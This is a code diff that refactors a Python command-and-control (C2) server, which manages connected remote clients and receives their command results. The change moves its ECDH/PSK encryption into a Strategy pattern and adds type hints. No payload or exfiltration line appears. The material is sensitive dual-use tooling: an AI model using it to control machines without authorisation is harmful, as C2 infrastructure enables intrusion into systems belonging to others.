@@ -7,15 +7,22 @@ Architecture:
 - Maintains connection pool of clients
 - Processes admin commands via CLI
 - Supports encryption and database logging
+- Uses Strategy pattern for encryption (SOLID principles)
 """
 
 import asyncio
 import logging
 import uuid
-from typing import Dict, Optional
+from typing import Dict, Optional, TYPE_CHECKING
 from datetime import datetime
 from server.protocol import ProtocolHandler
+from server.encryption_strategy import EncryptionStrategy, ECDHEncryptionStrategy, PSKEncryptionStrategy
 import config
+
+# Avoid circular import for type checking
+if TYPE_CHECKING:
+    from server.cli import C2CLI
+    from server.db_logger import DatabaseLogger
 
 logging.basicConfig(
     level=getattr(logging, config.LOG_LEVEL),
@@ -56,27 +63,36 @@ class ClientConnection:
 class C2Server:
     """Main C2 Server class"""
 
-    def __init__(self, host: str, port: int, encryption_key: Optional[bytes] = None, use_ecdh: bool = True):
+    def __init__(self, host: str, port: int, encryption_strategy: Optional[EncryptionStrategy] = None):
         """
         Initialize C2 Server
 
         Args:
             host: Server bind address
             port: Server listen port
-            encryption_key: Optional encryption key for secure communication (PSK mode)
-            use_ecdh: If True, use ECDH key exchange instead of PSK
+            encryption_strategy: Strategy for encryption (None = no encryption)
         """
         self.host = host
         self.port = port
-        self.use_ecdh = use_ecdh
-        self.encryption_key = encryption_key
+        self.encryption_strategy = encryption_strategy
         self.clients: Dict[str, ClientConnection] = {}
         self.server: Optional[asyncio.Server] = None
-        self.db_logger = None  # Will be set in Step 3
-        self.cli = None  # Will be set by CLI for prompt refresh
-        logger.info(f"C2 Server initialized (encryption mode: {'ECDH' if use_ecdh else 'PSK' if encryption_key else 'None'})")
+        self.db_logger: Optional['DatabaseLogger'] = None  # Will be set in Step 3
+        self.cli: Optional['C2CLI'] = None  # Will be set by CLI for prompt refresh
 
-    def set_db_logger(self, db_logger) -> None:
+        # Determine encryption mode for logging
+        if encryption_strategy is None:
+            mode = "None"
+        elif isinstance(encryption_strategy, ECDHEncryptionStrategy):
+            mode = "ECDH"
+        elif isinstance(encryption_strategy, PSKEncryptionStrategy):
+            mode = "PSK"
+        else:
+            mode = encryption_strategy.__class__.__name__
+
+        logger.info(f"C2 Server initialized (encryption mode: {mode})")
+
+    def set_db_logger(self, db_logger: 'DatabaseLogger') -> None:
         """Set database logger (Dependency Injection for Step 3)"""
         self.db_logger = db_logger
 
@@ -92,28 +108,24 @@ class C2Server:
         address = writer.get_extra_info('peername')
         client_id = str(uuid.uuid4())
 
-        # Create protocol handler for this client
-        if self.use_ecdh:
-            protocol = ProtocolHandler(use_ecdh=True)
+        # Create protocol handler for this client with encryption strategy
+        # Each client gets a fresh encryption strategy instance (important for ECDH)
+        if self.encryption_strategy is None:
+            client_strategy = None
+        elif isinstance(self.encryption_strategy, ECDHEncryptionStrategy):
+            # Create new ECDH instance for this client (ephemeral keys)
+            client_strategy = ECDHEncryptionStrategy()
         else:
-            protocol = ProtocolHandler(self.encryption_key)
+            # Reuse strategy for PSK and other stateless strategies
+            client_strategy = self.encryption_strategy
+
+        protocol = ProtocolHandler(client_strategy)
 
         try:
-            # Perform ECDH key exchange if enabled
-            if self.use_ecdh:
-                # Send server's public key
-                server_pubkey = protocol.get_public_key_bytes()
-                writer.write(server_pubkey)
-                await writer.drain()
+            # Perform encryption handshake (e.g., ECDH key exchange)
+            await protocol.perform_handshake(reader, writer, is_server=True)
 
-                # Receive client's public key (32 bytes)
-                client_pubkey = await reader.read(32)
-                if len(client_pubkey) != 32:
-                    logger.error(f"Invalid public key from client {client_id}")
-                    return
-
-                # Derive shared encryption key
-                protocol.derive_shared_key(client_pubkey)
+            if isinstance(client_strategy, ECDHEncryptionStrategy):
                 logger.info(f"ECDH key exchange completed with client {client_id}")
 
             # Create client connection object and register it
@@ -205,8 +217,8 @@ class C2Server:
 
         elif msg_type == "command_result":
             # Handle command execution result
-            command_id = message.get("command_id")
-            result = message.get("result")
+            command_id = message.get("command_id", "")
+            result = message.get("result", "")
             success = message.get("success", True)
 
             logger.info(f"Command {command_id} result from {client.client_id}: "
